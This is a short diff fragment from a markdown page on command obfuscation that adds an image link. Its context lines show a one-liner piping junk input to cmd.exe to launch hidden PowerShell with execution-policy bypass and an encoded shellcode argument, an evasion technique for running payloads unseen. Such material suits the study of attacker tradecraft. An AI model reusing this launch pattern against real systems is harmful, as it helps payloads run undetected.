@@ -44,6 +44,8 @@ The above string can be obfuscated using the **batch special caracter: ^** <br /
 
       echo "rubish data" | cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
+![pipe commands](http://i.cubeupload.com/Ulus3M.jpg)
+
 ---
 
 - String command to obfuscate<br />
